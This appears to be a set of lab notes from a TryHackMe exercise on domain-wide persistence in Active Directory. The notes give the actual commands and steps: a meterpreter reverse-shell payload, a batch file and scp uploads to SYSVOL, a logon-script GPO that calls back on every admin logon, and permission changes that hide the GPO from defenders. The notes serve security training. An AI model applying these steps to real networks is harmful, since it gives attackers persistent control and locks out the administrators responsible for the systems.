Domain wide persistence!

Here are some common techniques:
Restricted Group Membership - This could allow us administrative access to all hosts in the domain
Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain.

Before we create a GPO, create a meterpreter x64 listener payload for windows.

Then, we need to create a batch file script within the victims pc that tells it
to copy and then execute the listener:
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe

You will see that the script executes three commands chained together with &&. The script will copy the binary from the SYSVOL directory to the local machine, then wait 20 seconds, before finally executing the binary.

We can use SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:
scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/

Finally, start a MSF listener.

With our prep now complete, we can finally create the GPO that will execute it. You will need to RDP into THMWRK1 and use a runas window running as the Administrator for the next steps.

The first step uses our Domain Admin account to open the Group Policy Management snap-in:

In your runas-spawned terminal, type MMC and press enter.
Click on File->Add/Remove Snap-in...
Select the Group Policy Management snap-in and click Add
Click OK
You should be able to see the GPO manager

We will write a GPO that will be applied to all Admins, so right-click on the Admins OU and select Create a GPO in this domain, and Link it here. Give your GPO a name such as username - persisting GPO

Right-click on your policy and select Enforced. This will ensure that your policy will apply, even if there is a conflicting policy. This can help to ensure our GPO takes precedence, even if the blue team has written a policy that will remove our changes. Now you can right-click on your policy and select edit:

Let's get back to our Group Policy Management Editor:
Under User Configuration, expand Policies->Windows Settings.
Select Scripts (Logon/Logoff).
Right-click on Logon->Properties
Select the Scripts tab.
Click Add->Browse.

Let's navigate to where we stored our Batch and binary files:
Select your Batch file as the script and click Open and OK. Click Apply and OK. This will now ensure that every time one of the administrators (tier 2, 1, and 0) logs into any machine, we will get a callback.

Test it works. If you're in RDP, make sure to sign out of the windows machine,
do not just disconnect as this issues a disconnect rather than a logoff event.

Now that we know that our persistence is working, it is time to make sure the blue team can't simply remove our persistence. Go back to your MMC windows, click on your policy and then click on Delegation:
By default, all administrators have the ability to edit GPOs. Let's remove these permissions:

Right-Click on ENTERPRISE DOMAIN CONTROLLERS and select Edit settings, delete, modify security.
Click on all other groups (except Authenticated Users) and click Remove.

Click on Advanced and remove the Created Owner from the permissions:

By default, all authenticated Users must have the ability to read the policy. This is required because otherwise, the policy could not be read by the user's account when they authenticate to apply User policies. If we did not have our logon script, we could also remove this permission to make sure that almost no one would be able to read our Policy.

We could replace Authenticated Users with Domain Computers to ensure that computers can still read and apply the policy, but prevent any user from reading the policy. Let's do this to test, but remember this can result in you not getting a shell callback upon authentication since the user will not be able to read the PowerShell script, so make sure to test your shell before performing these steps. There is no going back after this:
Click Add.
Type Domain Computers, click Check Names and then OK.
Select Read permissions and click OK.
Click on Authenticated Users and click Remove.
Right after you perform these steps, you will get an error that you can no longer read your own policy:
You can also see on the sidebar that we can no longer read this policy

By performing these steps, we can ensure that even with the highest level of permissions, the blue team would not be able to remove our GPO unless they impersonated the machine account of a Domain Controller.
